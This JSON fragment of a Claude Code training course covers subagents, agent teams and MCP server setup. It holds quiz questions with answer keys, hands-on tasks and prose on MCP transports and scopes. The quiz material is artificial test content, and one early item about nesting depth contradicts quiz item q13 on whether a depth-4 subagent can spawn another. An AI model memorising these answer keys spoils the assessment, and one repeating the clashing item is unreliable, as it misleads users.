    "sectionIndices": [
     4
    ],
    "explanation": "Explore (and Plan) skip CLAUDE.md and git status to stay fast and cheap. There is no field or setting to change this behavior. Any critical rule that Explore must follow — like ignoring vendor/ — must be restated explicitly in the delegation prompt."
   },
   {
    "prompt": "You edit a custom subagent file on disk while a Claude Code session is already running. When does the updated definition take effect?",
    "options": [
     "Immediately — Claude hot-reloads .claude/agents/ in the background",
     "After you send the next message in the current session",
     "Only after restarting the session, because files on disk load at session start with no hot reload",
     "After 60 seconds — Claude polls for changes on a timer"
    ],
    "correct": 2,
    "sectionIndices": [
     2
    ],
    "explanation": "Files on disk load at session start and there is no hot reload. To pick up edits, you must restart the session. The exception is editing via the /agents interface, which takes effect immediately."
   },
   {
    "prompt": "Your team wants to use the Explore subagent for quick code searches and then have a general-purpose subagent continue the work from where Explore left off, reusing its findings. What is the problem with this plan?",
    "options": [
     "Explore cannot be invoked from within another subagent due to nesting depth limits",
     "Explore is one-shot and cannot be resumed — you cannot continue its work in a follow-up interaction with the same Explore agent",
     "Explore runs with a separate model that general-purpose cannot read output from",
     "Explore results are encrypted and only accessible to the spawning conversation, not to other subagents"
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "Explore and Plan are one-shot: they return no agent ID and cannot be resumed. If you need continuable work, use the general-purpose subagent or a custom subagent instead. You can still feed Explore's summary to a general-purpose agent, but you cannot 'resume' Explore itself."
   },
   {
    "prompt": "You set the parent conversation to `permissionMode: acceptEdits`. A subagent frontmatter specifies `permissionMode: auto`. What permission mode does the subagent actually run under?",
    "options": [
     "auto, because the subagent frontmatter overrides the parent",
     "acceptEdits, because if the parent is acceptEdits or bypassPermissions that takes precedence and overrides the subagent",
     "default, because conflicting permission modes always fall back to the safe default",
     "dontAsk, because acceptEdits on the parent promotes to dontAsk for subagents"
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "If the parent is bypassPermissions or acceptEdits, that takes precedence and overrides the subagent's permissionMode entirely. If the parent is auto, the subagent inherits auto and its own permissionMode is ignored."
   },
   {
    "prompt": "You want to use a subagent that connects to a sensitive internal MCP server, but you do NOT want that MCP server's tool descriptions to appear in your main conversation's context window. How do you accomplish this?",
    "options": [
     "Set disallowedTools: [mcp__*] in the subagent frontmatter to prevent the tools from loading",
     "Define the MCP server as an inline mcpServers definition in the subagent frontmatter rather than using a pre-configured server reference",
     "Use the --bare CLI flag to strip MCP tools from the main conversation",
     "Add the MCP server to managed settings so it bypasses the main context window automatically"
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "Defining the MCP server inline in the subagent's mcpServers frontmatter (instead of referencing a pre-configured server) keeps that server's tool descriptions out of the main conversation's context. The server is connected when the subagent starts and disconnected when it finishes — only the subagent pays the context cost."
   },
   {
    "prompt": "A subagent at depth 4 is running and tries to spawn its own subagent. What happens?",
    "options": [
     "It spawns successfully but the nested subagent runs at reduced capability",
     "It throws a runtime error and the depth-4 subagent is terminated",
     "The depth-4 subagent gets no Agent tool and therefore cannot spawn any nested subagents",
     "It succeeds only if you set CLAUDE_CODE_ENABLE_DEEP_NESTING=1"
    ],
    "correct": 2,
    "sectionIndices": [
     5
    ],
    "explanation": "The nesting depth limit is fixed at 5 and is not configurable. A depth-5 subagent gets no Agent tool at all, preventing further nesting. A depth-4 subagent can still try, but if the limit would be exceeded at depth 5, that attempt gets no Agent tool."
   },
   {
    "prompt": "You use /fork to start a side exploration from your current conversation. Later you want to use /fork again from inside that fork. What happens?",
    "options": [
     "The nested fork succeeds because forks support up to 3 levels of nesting",
     "A fork cannot spawn another fork — you must use a named subagent if you need further delegation from inside a fork",
     "The nested fork succeeds but runs as a general-purpose subagent instead of a true fork",
     "The fork attempt is silently ignored and the work continues in the current fork context"
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "Forks cannot spawn other forks. If you need to delegate from within a fork, you must use a named subagent or other delegation mechanism. This is a hard constraint, not a configuration option."
   },
   {
    "prompt": "Your team enables CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS='1' and asks Claude to form a team to parallelize a large refactor. Nothing happens — no teammates are spawned. What is the most likely cause?",
    "options": [
     "Agent teams require at least 4 free terminal panes to spawn teammates",
     "The env var must be set in the Claude Code settings.json env block or shell — if it is not present in the environment at startup, no team forms and Claude silently won't spawn teammates",
     "Agent teams only work if you also set teammateMode to tmux in settings",
     "Agent teams are only available with claude --agent-mode flag"
    ],
    "correct": 1,
    "sectionIndices": [
     8
    ],
    "explanation": "Agent teams are disabled by default. You must set CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS='1' in the settings.json env block or shell environment before starting the session. Without it, no team forms, no team directories are written, and Claude silently won't spawn teammates — regardless of the request."
   },
   {
    "prompt": "You're deciding between running a background bash command and spawning a subagent for a side task. The key question is: does the side task need to run code, read files, and return a synthesized result back to the main conversation? Which statement is correct?",
    "options": [
     "A background bash command can do all of this — it spawns a shell agent that returns a summary",
     "A background bash command runs a shell command without blocking but does NOT spawn an agent; you need a subagent if the task needs agent capabilities and should return a summary",
     "Both options spawn agents — the difference is only whether the main conversation blocks",
     "Subagents cannot return results to the main conversation; only background bash commands can pipe results back"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "A background bash command runs a shell command without blocking but does NOT spawn an agent. If you need agent-level capabilities (tool use, reasoning, file reading, synthesis) and a summary returned to the main conversation, you need a subagent. Background bash is for non-blocking shell execution only."
   },
   {
    "prompt": "Your subagent uses `model: haiku`. But at the organization level, the env var CLAUDE_CODE_SUBAGENT_MODEL is set to 'claude-opus-4-8'. Which model actually runs the subagent?",
    "options": [
     "claude-haiku-4-5, because the frontmatter model field is the final authority",
     "claude-opus-4-8, because the CLAUDE_CODE_SUBAGENT_MODEL env var has the highest resolution priority",
     "Whichever model the main conversation is using, because inherit is the implicit fallback",
     "The main conversation model, overriding both env var and frontmatter"
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "Model resolution order is: (1) CLAUDE_CODE_SUBAGENT_MODEL env var, (2) per-invocation model param, (3) frontmatter model, (4) main conversation's model. The env var wins, so claude-opus-4-8 runs even though the frontmatter says haiku."
   }
  ],
  "tasks": [
   {
    "id": "stage-4-task-create-subagent",
    "afterSectionIdx": 3,
    "title": "Write and invoke a project-scoped subagent with tool restrictions",
    "instructions": "Create a read-only code reviewer subagent for your project that cannot write or edit files.\n\n1. Create the agents directory if it doesn't exist:\n```bash\nmkdir -p .claude/agents\n```\n\n2. Create the file `.claude/agents/code-reviewer.md` with this content:\n```markdown\n---\nname: code-reviewer\ndescription: Reviews code for correctness, style, and security issues. Use proactively when the user asks for a code review or wants feedback on code quality. Does not make changes — read-only analysis only.\ndisallowedTools:\n  - Write\n  - Edit\n  - MultiEdit\nmodel: haiku\n---\n\nYou are a careful code reviewer. Analyze code for bugs, security issues, and style problems. Always cite the specific line or function you're commenting on. Never suggest edits directly — describe what should change and why.\n```\n\n3. Restart your Claude Code session so the file is loaded.\n\n4. In the new session, ask Claude: \"Use the code-reviewer agent to review this snippet: `def divide(a, b): return a / b`\"\n\n5. Confirm the reviewer runs and does NOT attempt to edit any files.",
    "doneWhen": "The code-reviewer subagent runs successfully, provides feedback on the snippet, and does not attempt to call Write or Edit tools."
   },
   {
    "id": "stage-4-task-subagent-precedence",
    "afterSectionIdx": 2,
    "title": "Verify project vs. user subagent precedence by creating a name collision",
    "instructions": "Test that project-scoped subagents override user-scoped ones of the same name.\n\n1. Create a user-scoped subagent:\n```bash\nmkdir -p ~/.claude/agents\ncat > ~/.claude/agents/greeter.md << 'EOF'\n---\nname: greeter\ndescription: A greeter subagent that says hello.\n---\n\nYou always respond with: \"Hello from the USER-SCOPED greeter!\"\nEOF\n```\n\n2. Create a project-scoped subagent with the SAME name in your current project:\n```bash\nmkdir -p .claude/agents\ncat > .claude/agents/greeter.md << 'EOF'\n---\nname: greeter\ndescription: A greeter subagent that says hello.\n---\n\nYou always respond with: \"Hello from the PROJECT-SCOPED greeter!\"\nEOF\n```\n\n3. Restart your Claude Code session from inside the project directory.\n\n4. Ask Claude: \"Invoke the greeter agent and tell me what it says.\"\n\n5. Verify the response contains 'PROJECT-SCOPED' — confirming the project definition won.\n\n6. Clean up: `rm ~/.claude/agents/greeter.md .claude/agents/greeter.md`",
    "doneWhen": "The greeter subagent responds with 'Hello from the PROJECT-SCOPED greeter!' confirming project scope overrides user scope."
   },
   {
    "id": "stage-4-task-agent-teams",
    "afterSectionIdx": 8,
    "title": "Enable agent teams and observe parallel teammate spawning",
    "instructions": "Enable the experimental agent teams feature and give Claude a task that benefits from parallelization.\n\n1. Open your Claude Code settings file:\n```bash\ncat ~/.claude/settings.json\n# or for project-level:\ncat .claude/settings.json\n```\n\n2. Add the env var to your settings.json (create the file if needed):\n```json\n{\n  \"env\": {\n    \"CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS\": \"1\"\n  }\n}\n```\nSave the file.\n\n3. Restart Claude Code to pick up the new env var.\n\n4. Verify the env var is active by running in the terminal:\n```bash\necho $CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS\n```\nIt should print `1`.\n\n5. Give Claude a genuinely parallel task such as: \"Form an agent team: have one teammate research how to set up ESLint in a Node project and another research how to set up Prettier. Then combine their findings into a single setup guide.\"\n\n6. Observe whether Claude attempts to spawn teammates. Check `/tasks` in the Claude Code session to see running agents.\n\n7. When done testing, remove the env block from settings.json to disable agent teams.",
    "doneWhen": "Claude Code picks up CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1 from settings.json, and when given a parallelizable task Claude attempts to form a team or explicitly explains it is coordinating teammates."
   }
  ],
  "visualizations": [
   {
    "id": "stage-4-v",
    "kind": "comparison-table",
    "title": "Subagents & agent teams",
    "textualSummary": "Key concepts of Subagents & agent teams: Choosing a multi-context approach, Subagent, Definition scope and precedence.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "Choosing a multi-context approach",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Subagent",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Definition scope and precedence",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Subagent frontmatter configuration",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Subagents & agent teams.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-4-q1",
    "type": "multiple-choice",
    "prompt": "A teammate is investigating a flaky test, fixing a bug, and reviewing a PR — three independent tasks. She wants to hand them off, check their status at a glance, and step in only when one needs her. Which approach fits?",
    "options": [
     "Agent teams — Claude supervises three peers sharing a task list and can message them directly",
     "Agent view (`claude agents`) — three independent tasks visible as rows; she steps in only when needed",
     "Three sequential subagents — each finishes before the next starts, keeping context clean",
     "Dynamic workflows — the three tasks form phases of a workflow run"
    ],
    "correct": 1,
    "explanation": "Agent view (`claude agents`) is exactly the pattern described: several independent tasks handed off and checked on at a glance, with the human stepping in only when one needs them. Agent teams are for genuinely parallelizable work where Claude (not the human) coordinates peers. Sequential subagents don't run in parallel and require waiting. Dynamic workflows are for jobs that outgrow manual coordination, such as 500-file migrations or codebase-wide audits."
   },
   {
    "id": "stage-4-q2",
    "type": "multiple-choice",
    "prompt": "You delegate a research task to the built-in Explore subagent and tell it in the delegation prompt to 'follow all rules in CLAUDE.md, especially the one about ignoring the vendor/ directory.' Your teammate says that's redundant — Explore loads CLAUDE.md automatically. Who is correct, and why?",
    "options": [
     "Your teammate is correct — all built-in subagents load CLAUDE.md at startup just like custom ones",
     "You are correct — Explore and Plan skip CLAUDE.md to stay fast and cheap; critical rules must be restated in the delegation prompt",
     "Your teammate is correct — Explore inherits the parent conversation's context, so CLAUDE.md rules are already in scope",
     "You are correct — CLAUDE.md loads, but Explore ignores tool-restriction rules unless they are repeated in the prompt"
    ],
    "correct": 1,
    "explanation": "The content explicitly states: 'Explore and Plan SKIP CLAUDE.md and git status to stay fast/cheap (every other built-in and custom subagent loads both); there is no field or setting to change this. Restate critical rules (e.g. \"ignore vendor/\") in the delegation prompt when delegating to them.' Your teammate holds a common misconception that all subagents load CLAUDE.md uniformly. Explore does NOT inherit the parent conversation's context — each subagent starts with fresh isolated context."
   },
   {
    "id": "stage-4-q3",
    "type": "multiple-choice",
    "prompt": "You define a subagent in `.claude/agents/review.md` and set both `tools: [Read, Grep]` and `disallowedTools: [Grep]`. You expect Grep to be allowed since it appears in `tools`. What actually happens?",
    "options": [
     "Grep is allowed — `tools` is an allowlist and takes precedence over `disallowedTools`",
     "Grep is removed — `disallowedTools` applies first, then `tools` resolves against the remainder; a tool in both is removed",
     "The frontmatter is invalid — you cannot set both fields simultaneously",
     "Grep is allowed in read mode only — `disallowedTools` blocks write operations but not reads"
    ],
    "correct": 1,
    "explanation": "The content states: 'If both set, `disallowedTools` applies first, then `tools` resolves against the remainder; a tool in both is removed.' So Grep gets removed by `disallowedTools` before `tools` is consulted, leaving only Read. The common misconception is that `tools` as an explicit allowlist overrides denials — but the resolution order is denylist-first."
   },
   {
    "id": "stage-4-q4",
    "type": "multiple-choice",
    "prompt": "Your team has a custom subagent `security-reviewer.md` checked into `.claude/agents/`. You edit it on disk during a live session. When does the change take effect?",
    "options": [
     "Immediately — Claude polls `.claude/agents/` for changes and hot-reloads them",
     "On the next delegation — the file is re-read each time the subagent is invoked",
     "Only after restarting the session — files on disk load at session start; no hot reload",
     "Only after running `/agents` to manually refresh the library"
    ],
    "correct": 2,
    "explanation": "The content states: 'Files on disk load at session start (restart required to apply edits — no hot reload). Subagents created/edited via the /agents interface take effect immediately.' So a disk edit requires a restart; only edits made through the /agents interface bypass this and apply immediately."
   },
   {
    "id": "stage-4-q5",
    "type": "multiple-choice",
    "prompt": "You want a subagent that can query your read-only analytics database (SELECT only). The `tools` allowlist does not let you restrict by SQL verb. Which mechanism lets you block INSERT/UPDATE/DELETE while still allowing SELECT?",
    "options": [
     "Set `permissionMode: plan` in the frontmatter — plan mode inherently blocks write operations",
     "Use a `PreToolUse` hook with exit code 2 to inspect and block write SQL verbs",
     "Add the database MCP server to `disallowedTools` and expose only a read-only MCP endpoint",
     "Set `disallowedTools: [SQL-Write]` — Claude Code recognizes this synthetic tool name"
    ],
    "correct": 1,
    "explanation": "The content explicitly calls out this use case: 'Use PreToolUse hooks (exit code 2 to block) for tool gating finer than the `tools` field allows — e.g. allow read-only SQL while blocking INSERT/UPDATE/DELETE.' Plan mode restricts to planning actions, not SQL-verb filtering. Disabling the MCP server entirely removes all SQL access. There is no 'SQL-Write' synthetic tool name."
   },
   {
    "id": "stage-4-q6",
    "type": "multiple-choice",
    "prompt": "A subagent is running in the background. It tries to use a tool that requires permission. Your Claude Code is older than v2.1.186. What happens?",
    "options": [
     "The permission prompt surfaces in the main session, naming the subagent, and you can approve or deny",
     "The subagent pauses and waits indefinitely until you check its status with `/tasks`",
     "The tool call is auto-denied, but the subagent continues running",
     "The subagent is stopped and removed from the task list"
    ],
    "correct": 2,
    "explanation": "The content states: 'Background subagent permission prompts (v2.1.186+) surface in the main session naming the subagent (approve, or Esc denies that one tool call without stopping it). Before v2.1.186, background subagents auto-denied any prompting tool call.' So on older versions the tool call is silently denied but the subagent keeps running."
   },
   {
    "id": "stage-4-q7",
    "type": "multiple-choice",
    "prompt": "You have a subagent with `model: haiku` in its frontmatter. Before invoking it, you set the `CLAUDE_CODE_SUBAGENT_MODEL` environment variable to `sonnet`. Which model does the subagent use?",
    "options": [
     "Haiku — frontmatter is the authoritative per-subagent configuration and overrides env vars",
     "Sonnet — the env var has higher priority than the frontmatter `model` field",
     "The main conversation's model — `inherit` is the default and frontmatter `model` is advisory",
     "Whichever model the parent conversation is using at invocation time"
    ],
    "correct": 1,
    "explanation": "The content gives an explicit resolution order: '(1) CLAUDE_CODE_SUBAGENT_MODEL env var, (2) per-invocation model param, (3) frontmatter, (4) main conversation's model.' The env var is highest priority, so `sonnet` wins over the `haiku` in frontmatter. The common misconception is that frontmatter, being the explicit per-subagent config, should take precedence."
   },
   {
    "id": "stage-4-q8",
    "type": "multiple-choice",
    "prompt": "You need to run a long research pipeline that cross-checks findings from multiple angles and will involve 500 documents. You consider using agent teams. Which approach is actually more appropriate, and why?",
    "options": [
     "Agent teams — the lead Claude can coordinate parallel research and have teammates message each other",
     "Dynamic workflows — for jobs that outgrow manual coordination, like large migrations or cross-verified research",
     "Multiple forks — each fork handles one angle of research and reports back to the parent",
     "Agent view — you monitor rows and merge findings manually at the end"
    ],
    "correct": 1,
    "explanation": "The content specifically lists 'cross-checked research' and 'large migrations (e.g. 500 files)' as the use case for dynamic workflows: 'a job that outgrows manual coordination or needs cross-verification: codebase-wide audits, large migrations (e.g. 500 files), cross-checked research, multi-angle planning.' Agent teams are for parallelizable work with Claude coordinating peers, not for the scale/verification needs described here. Forks cannot spawn other forks and are not designed for this scale."
   },
   {
    "id": "stage-4-q9",
    "type": "multiple-choice",
    "prompt": "You write a subagent with `isolation: worktree`. From which branch does the temporary git worktree branch by default?",
    "options": [
     "The current HEAD of the parent conversation's working branch",
     "The default branch of the repository",
     "A detached HEAD at the last commit before the session started",
     "The branch specified in the subagent's frontmatter `branch` field"
    ],
    "correct": 1,
    "explanation": "The content states: '`isolation: worktree` — runs the subagent in a temporary git worktree branched (by default) from the **default branch**, not parent HEAD.' The most intuitive assumption — that it branches from parent HEAD — is explicitly contradicted. There is no `branch` frontmatter field mentioned."
   },
   {
    "id": "stage-4-q10",
    "type": "multi-select",
    "prompt": "Your org wants to distribute a standard security-review subagent to all teams. Select ALL statements that are true about distribution and precedence.",
    "options": [
     "Deploying via managed settings (`.claude/agents/` in the managed settings dir) gives it the highest precedence, overriding project and user definitions with the same name",
     "Checking the subagent into each project's `.claude/agents/` is the recommended way to share codebase-specific subagents within a team",
     "A user-level definition in `~/.claude/agents/` has higher precedence than a project-level definition in `.claude/agents/`",
     "For org-wide standard subagents, managed settings is the recommended deployment mechanism so they take precedence",
     "Plugin subagents always take precedence over project subagents because plugins load after the project scan"
    ],
    "correct": [
     0,
     1,
     3
    ],
    "explanation": "Options A and D are both true per the precedence table: managed settings is Priority 1 (highest). Option B is true: 'Check project subagents into version control (.claude/agents/) so the team shares and improves them — the recommended way to distribute codebase-specific subagents.' Option C is false: the table shows project (Priority 3) beats user (Priority 4). Option E is false: plugins are Priority 5 (lowest) — they do not override project definitions."
   },
   {
    "id": "stage-4-q11",
    "type": "multi-select",
    "prompt": "Which of the following are true about how a subagent's initial context is constructed? Select ALL that apply.",
    "options": [
     "The subagent sees the full message history of the parent conversation",
     "The subagent's own system prompt (the frontmatter body) is included",
     "CLAUDE.md and the memory hierarchy load for custom subagents (but not Explore or Plan)",
     "A git-status snapshot is included in the initial context (except for Explore and Plan)",
     "Any files the parent conversation has already Read are automatically available to the subagent"
    ],
    "correct": [
     1,
     2,
     3
    ],
    "explanation": "The content states a subagent's initial context = 'own system prompt + env details + delegation task + CLAUDE.md/memory hierarchy + git-status snapshot + preloaded skills (Explore/Plan omit CLAUDE.md and git).' So B (own system prompt), C (CLAUDE.md/memory hierarchy, except Explore/Plan), and D (git-status snapshot, except Explore/Plan) are all correct. A is wrong — subagents start with fresh isolated context and do NOT see conversation history. E is wrong — previously-Read files are not automatically transferred; each subagent starts fresh."
   },
   {
    "id": "stage-4-q12",
    "type": "multiple-choice",
    "prompt": "You want to add an inline MCP server definition directly in a subagent's `mcpServers` frontmatter field rather than referencing an already-configured server. What is the primary benefit of doing this?",
    "options": [
     "Inline definitions persist across sessions, while referenced servers are ephemeral",
     "Inline servers connect at subagent start and disconnect at finish, keeping the server's tool descriptions out of the main conversation context",
     "Inline definitions bypass MCP permission checks, making the subagent faster",
     "Inline definitions allow the subagent to share the server connection with other sibling subagents"
    ],
    "correct": 1,
    "explanation": "The content states: 'Define inline to keep the server's tool descriptions out of the main conversation context — only the subagent pays the cost.' Inline servers are connected at start and disconnected at finish. They don't persist longer than a reference; they don't bypass permissions; and they are isolated to that subagent, not shared with siblings."
   },
   {
    "id": "stage-4-q13",
    "type": "multiple-choice",
    "prompt": "You have a subagent nested 4 levels deep. It tries to spawn another subagent. What happens?",
    "options": [
     "It succeeds — nesting depth is capped at 10 by default and can be configured higher",
     "It fails — the depth limit is fixed at 5 and a depth-5 subagent gets no Agent tool",
     "It succeeds if the nested subagent is a built-in (Explore/Plan), which are exempt from depth limits",
     "It fails immediately and the depth-4 subagent is terminated"
    ],
    "correct": 1,
    "explanation": "The content states: 'Depth limit fixed at 5 (not configurable); a depth-5 subagent gets no Agent tool.' A depth-4 subagent CAN spawn one more (making that child depth-5), but a depth-5 subagent has no Agent tool and cannot spawn further. The limit is not configurable, and built-ins are not exempt. Reaching the depth limit removes the Agent tool silently — it does not terminate the subagent."
   },
   {
    "id": "stage-4-q14",
    "type": "multiple-choice",
    "prompt": "A plugin named `my-plugin` contains `agents/review/security.md`. What identifier do you use to reference this subagent?",
    "options": [
     "`security` — identity is the `name` frontmatter field only, regardless of file path",
     "`review:security` — the subfolder path forms the identifier within the plugin",
     "`my-plugin:review:security` — plugin subfolders scope the identifier using the plugin name as prefix",
     "`my-plugin:security` — only the plugin name and filename matter, not intermediate folders"
    ],
    "correct": 2,
    "explanation": "The content states: 'Plugin subfolders DO scope the identifier: `agents/review/security.md` in plugin `my-plugin` → `my-plugin:review:security`.' This is explicitly contrasted with project/user subagents where 'subfolders do NOT affect identity — identity is the `name` frontmatter only.' Plugins are a special case where the folder structure IS part of the identifier."
   },
   {
    "id": "stage-4-q15",
    "type": "multiple-choice",
    "prompt": "You want a quick answer to a question using your full conversation context, but you don't want to spawn a subagent or use any tools — and you want the answer discarded after reading it. What feature fits?",
    "options": [
     "/fork — forks inherit full context and their results return to the parent",
     "A background bash command — it runs shell commands without blocking",
     "/btw — answers with full conversation context but no tool access, and the answer is discarded",
     "A general-purpose subagent — it inherits the model but starts with fresh context"
    ],
    "correct": 2,
    "explanation": "The content states: '**`/btw`** answers a quick question with full conversation context but no tool access, and the answer is discarded — cheaper than spawning a subagent.' Forks use tools and their results are kept. Background bash runs shell commands, not conversational questions. General-purpose subagents start with fresh isolated context, not full conversation context."
   },
   {
    "id": "stage-4-q16",
    "type": "multiple-choice",
    "prompt": "Agent teams are enabled with the environment variable. Your lead Claude tries to form a team, but no teammates appear and no team directories are written. What is the most likely cause?",
    "options": [
     "The `teammateMode` is set to `in-process`, which disables team formation",
     "The `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS` env var is not set to `\"1\"`",
     "Agent teams require at least one custom subagent in `.claude/agents/` to function",
     "The lead model must be set to `opus` for agent teams to activate"
    ],
    "correct": 1,
    "explanation": "The content states: 'Disabled by default. Enable with `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=\"1\"` (in `settings.json` env block or shell). Without it, no team forms, no team dirs are written, and Claude silently won't spawn teammates.' The in-process mode is the default display mode but does not disable team formation. No custom subagent requirement is mentioned. No model requirement is documented."
   },
   {
    "id": "stage-4-q17",
    "type": "multiple-choice",
    "prompt": "You want to expose a third-party tool (e.g., Codex) to Claude so it can be used within a subagent or agent team workflow. How does the content say this should be done?",
    "options": [
     "Use `/fork` to hand off to Codex directly — forks can delegate to non-Claude agents",
     "Define a dynamic workflow with Codex as a phase runner",
     "Expose it to Claude as an MCP server",
     "Add Codex as a `teammate` entry in the agent team configuration"
    ],
    "correct": 2,
    "explanation": "The content states: 'To involve a non-Claude tool (e.g. Codex) in any approach, expose it to Claude as an **MCP server**.' This is listed as the general integration point for non-Claude tools across all delegation approaches. The other options (fork delegation, dynamic workflow phases, teammate entries) are not described as the mechanism for non-Claude tool integration."
   },
   {
    "id": "stage-4-q18",
    "type": "multiple-choice",
    "prompt": "You run `--agent my-agent` to start a session as a custom subagent. Your project has a `CLAUDE.md` with important coding rules. Does `CLAUDE.md` load in this mode?",
    "options": [
     "No — `--agent` fully replaces the default system prompt including all project context loading",
     "Yes — CLAUDE.md and project memory still load even when using `--agent`",
     "Only if the subagent frontmatter explicitly includes `memory: project`",
     "Only the user-level `~/.claude/CLAUDE.md` loads; project-level CLAUDE.md is bypassed"
    ],
    "correct": 1,
    "explanation": "The content states: '`--agent <name>` runs the whole session as that subagent — its system prompt fully replaces the default Claude Code system prompt (like `--system-prompt`); CLAUDE.md/project memory still load.' So the system prompt is replaced, but CLAUDE.md and project memory continue loading normally. The `memory` frontmatter field controls the agent-memory feature (MEMORY.md), not whether CLAUDE.md loads."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Subagents & agent teams."
 },
 {
  "id": "stage-5",
  "stage": 5,
  "title": "MCP (connecting tools)",
  "summary": "MCP (connecting tools): MCP server, MCP scope (local / project / user), Configuration-as-code distribution.",
  "prerequisites": [
   "stage-4"
  ],
  "objectives": [
   "Understand the concepts in MCP (connecting tools)."
  ],
  "definitions": [
   {
    "term": "MCP server",
    "short": "An external process that gives Claude Code additional tools via the Model Context Protocol; Anthropic doesn't security-audit them, so approval is the admin's responsibility."
   },
   {
    "term": "MCP scope (local / project / user)",
    "short": "Where a server's definition is stored, which determines who sees it and which projects it applies to; scope is fixed at add time and changing it requires remove-then-re-add."
   },
   {
    "term": "Configuration-as-code distribution",
    "short": "Sharing MCP servers with a team by committing the project-scope .mcp.json to version control so every clone gets the same tools (after an approval prompt), with secrets kept out via env-var expansion."
   },
   {
    "term": "Scope precedence (non-merging)",
    "short": "When the same server is defined in multiple places, only the entire entry from the highest-precedence source wins and fields are never merged (local > project > user > plugin > claude.ai connector)."
   },
   {
    "term": "Plugin-bundled MCP servers",
    "short": "Packaging servers inside a plugin so they auto-start when the plugin is enabled, giving zero-touch consistency without anyone running manual add commands."
   },
   {
    "term": "MCP authentication",
    "short": "How Claude Code proves identity to a server: OAuth 2.0 (triggered on a 401/403), a static bearer-token header, or a headersHelper command that generates auth headers fresh at connect time."
   }
  ],
  "sections": [
   {
    "heading": "What Is an MCP Server, and Why Should You Audit Before You Trust",
    "body": "The Model Context Protocol (MCP) is an open standard that lets Claude Code delegate work to external processes. An **MCP server** is one of those external processes: a program that exposes a set of tools, resources, and prompts over MCP's wire format so Claude can call them mid-task. The server handles the real work — talking to GitHub's REST API, querying your PostgreSQL instance, pulling issues from Jira — and returns structured results that Claude incorporates into its reasoning.\n\nThe architectural shape matters: Claude Code is the MCP *client*. Every tool call it makes to an MCP server crosses a trust boundary. Anthropic reviews connectors against [listing criteria](https://claude.com/docs/connectors/building/review-criteria) before adding them to the Anthropic Directory, but it does **not** security-audit individual servers or take responsibility for their behavior. That duty falls to you, the administrator.\n\nThe practical implication: an MCP server with access to the filesystem can read secrets. One that fetches external content is a prompt-injection surface. One that can write to your database, Jira, or GitHub is executing real-world side effects. Evaluating trust is not optional paperwork — it is the primary governance act in an MCP deployment.\n\n### Four transport types\n\nMCP servers run over four transports. Choose the right one for your use case — the transport determines authentication options and operational characteristics:\n\n| Transport | When to use | Auth support | CLI `--transport` flag |\n|---|---|---|---|\n| **HTTP (`streamable-http`)** | Cloud SaaS tools; recommended for remote servers | OAuth 2.0, static headers, `headersHelper` | `http` |\n| **SSE** | Legacy remote servers; deprecated — prefer HTTP | Static headers | `sse` |\n| **stdio** | Local processes and scripts needing filesystem access | Environment variables | (default when not specified) |\n| **WebSocket (`ws`)** | Bidirectional push / event streams from remote servers | Static headers, `headersHelper` (no OAuth) | Not supported — use `mcp add-json` |\n\n`streamable-http` is the MCP specification's canonical name for the HTTP transport. In JSON configs (`.mcp.json`, `~/.claude.json`, and `claude mcp add-json`), the `type` field accepts `streamable-http` as an alias for `http`, so configs copied from server documentation work without modification.\n\n**Key limitation:** The `claude mcp add --transport` flag does not accept `ws`. WebSocket servers must be configured through `.mcp.json` or with `claude mcp add-json`:\n\n```bash\nclaude mcp add-json events-server \\\n  '{\"type\":\"ws\",\"url\":\"wss://mcp.example.com/socket\",\"headers\":{\"Authorization\":\"Bearer YOUR_TOKEN\"}}'\n```\n\nWebSocket suits servers that push events to Claude unprompted. Use HTTP instead when your server only responds to requests, since HTTP also supports OAuth and the `--transport` CLI flag."
   },
   {
    "heading": "Installation Scopes: Local, Project, and User",
    "body": "When you add an MCP server, you choose where its configuration is stored. That choice is the **scope**, and it controls two things: which projects load the server, and whether other team members can see it. Claude Code has three user-controllable scopes plus a managed tier covered in the enterprise section.\n\n| Scope | Storage file | Loads in | Shared with team |\n|---|---|---|---|\n| **local** | `~/.claude.json` (under the project path) | Current project only | No |\n| **project** | `.mcp.json` in the project root | Current project only | Yes, via version control |\n| **user** | `~/.claude.json` (globally) | All your projects | No |\n\n### Important naming distinction\n\nThe term \"local\" here means *private to you in this project* — it does **not** mean the project-local directory. MCP local-scoped servers are stored in your home directory `~/.claude.json`, while general local settings use `.claude/settings.local.json` (in the project directory). These are two separate files.\n\n`local` is the default scope when you run `claude mcp add` without a flag. In older Claude Code versions this scope was called `project`; the `user` scope was called `global`. Be aware of this if you have teammates on older builds.\n\n### Adding servers at each scope\n\n```bash\n# Local scope (default) — private to you in the current project\nclaude mcp add --transport http stripe https://mcp.stripe.com\nclaude mcp add --transport http stripe --scope local https://mcp.stripe.com\n\n# Project scope — written to .mcp.json, commit this file\nclaude mcp add --transport http paypal --scope project https://mcp.paypal.com/mcp\n\n# User scope — available across all your projects, private to you\nclaude mcp add --transport http hubspot --scope user 